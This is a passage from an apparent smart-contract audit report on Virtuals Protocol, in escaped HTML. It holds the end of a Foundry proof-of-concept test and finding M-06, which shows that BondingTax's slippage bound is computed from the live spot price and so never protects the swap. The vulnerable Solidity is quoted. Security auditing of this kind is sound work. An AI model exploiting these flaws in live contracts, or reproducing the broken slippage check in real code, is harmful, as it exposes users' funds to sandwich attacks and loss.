class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, ) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test agent\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;TA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e45000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e.5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e.5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSignature\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;tokenInfo(address)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Failed to get token info\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;agentToken balance of pair  :\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;token balance of alice + bob:\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) + \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertNotEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) + \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-06-bondingtax-has-invalid-slippage-implementation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-06-bondingtax-has-invalid-slippage-implementation\" aria-label=\"m 06 bondingtax has invalid slippage implementation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-14\"\u003e[M-06] \u003ccode\u003eBondingTax\u003c/code\u003e has invalid slippage implementation\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-631\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-307\"\u003e0x1982us\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-243\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-586\"\u003eDamola0x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-300\"\u003ekodyvim\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-442\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-798\"\u003eMatin\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-435\"\u003eslowbugmayor\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eIn BondingTax.sol, \u003ccode\u003eswapForAsset\u003c/code\u003e will swap \u003ccode\u003etaxTokens\u003c/code\u003e to \u003ccode\u003eassetToken\u003c/code\u003e through uniswap router. \u003c/p\u003e\n\u003cp\u003eThe issue is that the slippage calculation (\u003ccode\u003eminOutput\u003c/code\u003e) is invalid. Currently, \u003ccode\u003emintOutput\u003c/code\u003e is a percentage that is based on \u003ccode\u003erouter.getAmountsOut(amount, path)\u003c/code\u003e. Since \u003ccode\u003erouter.getAmountsOut(amount, path)\u003c/code\u003e is also dynamic based on the actual uniswapV2pair spot price; this means \u003ccode\u003eminOutput\u003c/code\u003e will simply be a fraction of the actual swap result. The slippage check will always pass.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyBondingRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...       \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e|\u0026gt;      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Failed to fetch token price\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_slippage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e |\u0026gt;     \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etreasury\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e300\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSwapExecuted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSwapFailed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca 